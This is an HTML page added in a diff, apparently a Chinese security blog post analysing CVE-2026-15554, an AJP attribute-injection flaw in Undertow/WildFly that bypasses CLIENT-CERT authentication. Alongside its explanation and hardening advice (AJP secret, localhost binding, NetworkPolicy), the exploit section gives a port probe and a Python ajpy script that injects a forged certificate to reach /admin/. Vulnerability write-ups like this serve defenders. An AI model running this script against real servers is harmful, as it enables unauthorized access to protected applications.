@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AJP协议属性注入：绕过CLIENT-CERT认证的新攻击面 — DARKSEC</title>
+<meta name="description" content="CVE-2026-15554：Undertow AJP ssl_cert/is_ssl属性注入→CLIENT-CERT认证完全绕过">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 协议安全 / 认证绕过</div>
+        <h1>🔓 AJP协议属性注入：绕过CLIENT-CERT认证的新攻击面</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-22</span>
+          <span>⏱ 6 min read</span>
+          <span>🏷 CVE / AJP / 认证绕过 / Java</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#vuln">漏洞概述</a></li>
+            <li><a href="#background">AJP协议背景</a></li>
+            <li><a href="#attack">攻击原理</a></li>
+            <li><a href="#exploit">利用与检测</a></li>
+            <li><a href="#impact">影响范围与扩展</a></li>
+            <li><a href="#defense">防御方案</a></li>
+          </ul>
+        </div>
+
+        <h2 id="vuln">🐱‍💻 漏洞概述</h2>
+        <p>CVE-2026-15554 (CVSS 7.4) 是 Red Hat EAP 中 Undertow 组件的一个认证绕过漏洞。攻击者可以构造恶意的AJP请求，通过注入 <code>ssl_cert</code> 和 <code>is_ssl</code> 属性，伪造客户端TLS证书身份，从而完全绕过 CLIENT-CERT 认证机制。</p>
+
+        <blockquote>
+          <p>⚡ <strong>一句话总结</strong>：AJP端口默认监听所有接口→任何能TCP连接8009的攻击者可以伪造X.509证书→绕过整个CLIENT-CERT信任链</p>
+        </blockquote>
+
+        <h2 id="background">🔧 AJP协议背景</h2>
+        <p>AJP (Apache JServ Protocol) 是 Apache httpd 与后端 Java 应用服务器 (Tomcat/WildFly/JBoss) 之间的二进制通信协议，工作在 TCP 8009 端口。</p>
+
+        <p>它的设计假设是：<strong>只有前端反向代理会发送AJP请求</strong>。但TCP协议本身没有身份验证——任何能到达8009端口的主机都可以直接构造AJP数据包。</p>
+
+        <pre><code>正常架构：
+Client → [TLS] → Apache httpd (mod_jk) → [AJP:8009] → Tomcat/WildFly
+                         ↑
+                    TLS终止后设置:
+                    ssl_cert = 客户端证书
+                    is_ssl = true
+
+攻击场景：
+Attacker → [TCP:8009] → WildFly
+                ↑
+          直接注入伪造的:
+          ssl_cert = 攻击者证书
+          is_ssl = true</code></pre>
+
+        <h2 id="attack">⚡ 攻击原理</h2>
+        <p>核心在于三个致命的设计缺陷叠加：</p>
+
+        <h3>1️⃣ AJP端口暴露</h3>
+        <p>AJP连接器默认监听 <code>0.0.0.0:8009</code>，而非仅 <code>127.0.0.1</code>。在K8s集群中，这意味着任何Pod都可以访问。</p>
+
+        <h3>2️⃣ 协议属性可伪造</h3>
+        <p>AJP协议的属性字段是明文的键值对，没有认证或签名。攻击者可以直接构造包含 <code>ssl_cert</code> 和 <code>is_ssl</code> 的AJP Forward Request数据包。</p>
+
+        <pre><code># 伪造AJP请求中的关键属性（伪代码）
+ajp_request.set_attribute("ssl_cert", ATTACKER_CERT_PEM)
+ajp_request.set_attribute("is_ssl", "true")
+# 后端会将其映射为:
+# javax.servlet.request.X509Certificate = [attackerCert]</code></pre>
+
+        <h3>3️⃣ 后端信任协议属性</h3>
+        <p>WildFly/Undertow的AJP监听器将这些属性直接映射为Servlet API中的 <code>X509Certificate</code>——应用代码无法区分这是真实的TLS证书还是AJP注入的伪造证书。</p>
+
+        <p>关键洞察：这与之前的 <a href="https://www.cvedetails.com/cve/CVE-2020-1938/">Ghostcat (CVE-2020-1938)</a> 不同。Ghostcat利用AJP的<strong>文件读取功能</strong>，而CVE-2026-15554利用AJP的<strong>属性注入功能</strong>实现认证绕过，影响范围更广。</p>
+
+        <h2 id="exploit">🎯 利用与检测</h2>
+        <h3>快速检测AJP端口暴露</h3>
+        <pre><code># 扫描目标是否暴露AJP端口
+nmap -p 8009 target.example.com
+
+# 如果8009开放，发送CPING探测
+python3 -c "
+import socket
+s = socket.socket()
+s.settimeout(5)
+s.connect(('target', 8009))
+# AJP CPING 包 (type=0x0a)
+s.send(b'\x12\x34\x00\x01\x0a')
+resp = s.recv(16)
+if resp:
+    print('[!] AJP端口可达，可能存在属性注入风险')
+    print(f'    响应: {resp.hex()}')
+s.close()
+"</code></pre>
+
+        <h3>属性注入检测</h3>
+        <pre><code># 使用ajpy工具发送带伪造证书的请求
+# pip install ajpy
+python3 -c "
+import ajpy
+
+# 构造Forward Request + ssl_cert属性
+req = ajpy.AjpForwardRequest(
+    method='GET',
+    server_name='target',
+    server_port=8009,
+    remote_addr='10.0.0.1',
+    req_uri='/admin/',
+)
+# 注入伪造证书属性
+req.attributes['ssl_cert'] = open('attacker.crt').read()
+req.attributes['is_ssl'] = 'true'
+
+# 发送并检查是否获得认证后的内容
+resp = req.send('target', 8009)
+if resp.status_code == 200 and 'admin' in resp.body.lower():
+    print('[+] CLIENT-CERT认证绕过成功！')
+"</code></pre>
+
+        <h2 id="impact">🌊 影响范围与扩展</h2>
+
+        <h3>受影响组件</h3>
+        <ul>
+          <li>🔴 <strong>WildFly / JBoss EAP</strong> — Undertow AJP连接器直接受影响</li>
+          <li>🔴 <strong>Tomcat AJP</strong> — 类似攻击面（不同CVE但同源问题）</li>
+          <li>🟡 <strong>Jetty AJP</strong> — 需验证是否接受属性注入</li>
+        </ul>
+
+        <h3>🔗 同类协议攻击面扩展</h3>
+        <p>这不是AJP独有的问题。<strong>任何缺乏认证的二进制内部协议</strong>都存在类似的属性注入风险：</p>
+
+        <ul>
+          <li>📌 <strong>MySQL <code>CLIENT_SSL</code>标志</strong> → 伪造SSL状态绕过加密要求</li>
+          <li>📌 <strong>PostgreSQL SSLRequest</strong> → 中间人攻击</li>
+          <li>📌 <strong>Redis RESP协议</strong> → 认证绕过</li>
+          <li>📌 <strong>gRPC metadata</strong> → TLS证书属性注入</li>
+          <li>📌 <strong>HAProxy PROXY protocol</strong> → 源IP伪造</li>
+        </ul>
+
+        <blockquote>
+          <p>💡 <strong>核心洞察</strong>：「内部通道」的假设在容器化/微服务架构中已被打破。任何TCP可达的服务，其「信任」都需要显式认证来保证。</p>
+        </blockquote>
+
+        <h3>🧠 证书认证的信任根被打破</h3>
+        <p>CLIENT-CERT认证的设计假设是：「证书由TLS层可信地传递」。但AJP把TLS层剥离后通过协议属性重新组装证书→假证书可以绕过整个TLS信任链。这是一个<strong>系统性的信任链断裂</strong>问题。</p>
+
+        <h2 id="defense">🛡 防御方案</h2>
+
+        <h3>紧急措施</h3>
+        <pre><code># 1. Tomcat: AJP仅监听localhost + 启用secret认证
+# server.xml
+&lt;Connector port="8009" address="127.0.0.1"
+           protocol="AJP/1.3" secretRequired="true"
+           secret="your-strong-random-secret"/&gt;
+
+# 2. WildFly CLI: 配置AJP secret
+/subsystem=undertow/server=default-server/ajp-listener=ajp: \
+    write-attribute(name=secret, value="strong-random-secret")
+
+# 3. K8s NetworkPolicy: 限制AJP端口访问
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: restrict-ajp
+spec:
+  podSelector:
+    matchLabels:
+      role: java-app
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          role: reverse-proxy</code></pre>
+
+        <h3>长期方案</h3>
+        <ul>
+          <li>✅ AJP secret认证（Tomcat 9.0.31+ / WildFly 23+ 强制）</li>
+          <li>✅ 替换AJP为HTTP反向代理 + mTLS</li>
+          <li>✅ 网络策略限制8009端口仅允许前端代理访问</li>
+          <li>✅ 审计所有「内部协议」的认证状态：Redis/MySQL/PostgreSQL/gRPC</li>
+          <li>✅ 扫描所有Java应用服务器的AJP暴露面</li>
+        </ul>
+
+        <div class="article-tags">
+          <span class="tag pink">CVE-2026-15554</span>
+          <span class="tag">AJP协议</span>
+          <span class="tag">认证绕过</span>
+          <span class="tag">WildFly</span>
+          <span class="tag">协议安全</span>
+          <span class="tag">K8s安全</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+      <p class="nya">~ 感谢阅读 nya~ 🐱✨</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
